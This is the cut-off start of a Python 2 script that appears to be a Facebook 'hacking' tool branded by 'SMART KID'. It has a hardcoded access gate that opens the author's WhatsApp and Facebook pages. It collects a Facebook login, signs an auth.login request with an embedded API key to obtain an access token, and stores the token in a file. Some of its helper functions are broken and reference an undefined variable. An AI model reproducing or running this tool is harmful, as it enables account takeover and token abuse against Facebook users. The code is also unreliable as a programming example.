#!/usr/bin/python2
#coding=utf-8


import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]


def keluar():
	print "\033[1;96m[!] \x1b[1;91mExit"
	os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(00000.1)


#### LOGO ####
logo = """
▒█▀▀▀█ █▀▄▀█ █▀▀█ █▀▀█ ▀▀█▀▀ 
░▀▀▀▄▄ █░▀░█ █▄▄█ █▄▄▀ ░░█░░ 
▒█▄▄▄█ ▀░░░▀ ▀░░▀ ▀░▀▀ ░░▀░░ 

▒█░▒█ █▀▀█ █▀▀ █░█ █▀▀ █▀▀█ █▀▀ 
▒█▀▀█ █▄▄█ █░░ █▀▄ █▀▀ █▄▄▀ ▀▀█ 
▒█░▒█ ▀░░▀ ▀▀▀ ▀░▀ ▀▀▀ ▀░▀▀ ▀▀▀
                               
           Programmer: SMART KID
       Subscrip To My Channel For UpdateS
         👉   Technical Smart👈
            SMART HACKERS
\033[0;39m╔▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬╗
\033[0;39m║\033[0;36m* \033[0;36mAuthor  \033[1;36m : \033[1;31mSMART KID\033[0;31m║
\033[0;39m║\033[1;33m* \033[1;33mWhatsapp  \033[1;33m : \033[1;33m\033[4m+2348128792249\033[0m \033[0;31m║
\033[0;39m║\033[0;36m* \033[0;32mYoutube \033[1;32m: \033[1;32mTechnical Smart\033[0;31m║
\033[0;34m╚▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬╝"""

def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;96m[●] \x1b[1;93mSedang masuk \x1b[1;97m"+o),;sys.stdout.flush();time.sleep(1)


back = 0
Success = []
checkpoint = []
oks = []
id = []
listgrup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

os.system("clear")
print "\x1b[0;31m⚔═══════════════════════════☠═══════════════════════════⚔"
print  """\x1b[0;31m [¤] \x1b[0;31mWELCOME BRO
\x1b[0;31m  \033[1;96m   [¤] \x1b[0;31mWHATSAPP : +2348128792249\x1b[1;96m  
\033[1;93m [¤] \x1b[0;31mSTAY HOME\x1b[1;96m      [¤] \x1b[0;31mFACEBOOK : SMART KID\x1b[1;96m  
\033[1;93m [¤] \x1b[0;31mTHIS TOOL BY SMART KID\x1b[1;96m  [¤] \x1b[0;31mYOUTUBE  : TECHNICAL SMART\x1b[0;31m"""
print " \x1b[1;93m⚔══════════════════════════☠═══════════════════════════⚔"

CorrectUsername = "Smart"
CorrectPassword = "Kid"

loop = 'true'
while (loop == 'true'):
    username = raw_input("\033[1;96m[☆] \x1b[0;31mUSERNAME TOOLS INI \x1b[1;96m>>>> ")
    if (username == CorrectUsername):
    	password = raw_input("\033[1;96m[☆] \x1b[0;31mPASSWORD TOOLS INI \x1b[1;96m>>>> ")
        if (password == CorrectPassword):
            print "Congratulations as " + username
            loop = 'false'
        else:
            print "yang bener dong"
            os.system('xdg-open https://www.facebook.com/emeka.obinna.52643')
    else:
        print "salah sayang!"
        os.system('xdg-open https://wa.me/2348128792249?text=Hello%2C%20Smart%20my%20name%20is')

def login():
	os.system('clear')
	try:
		toket = open('login.txt','r')
		menu() 
	except (KeyError,IOError):
		os.system('clear')
		print logo
		print 42*"\033[1;96m="
		print('\033[1;96m[☆] \x1b[1;91mLOG IN YOUR FACEBOOK ACCOUNT \x1b[1;96m[☆]' )
		id = raw_input('\033[1;96m[+] \x1b[0;34mID/Email \x1b[1;91m: \x1b[1;92m')
		pwd = raw_input('\033[1;96m[+] \x1b[0;34mPassword \x1b[1;91m: \x1b[1;92m')
		tik()
		try:
			br.open('https://m.facebook.com')
		except mechanize.URLError:
			print"\n\033[1;96m[!] \x1b[1;91mStart hacking"
			keluar()
		br._factory.is_html = True
		br.select_form(nr=0)
		br.form['email'] = id
		br.form['pass'] = pwd
		br.submit()
		url = br.geturl()
		if 'save-device' in url:
			try:
				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
				x=hashlib.new("md5")
				x.update(sig)
				a=x.hexdigest()
				data.update({'sig':a})
				url = "https://api.facebook.com/restserver.php"
				r=requests.get(url,params=data)
				z=json.loads(r.text)
				unikers = open("login.txt", 'w')
				unikers.write(z['access_token'])
				unikers.close()
				print '\n\x1b[1;36;40m[✓] Login Succe
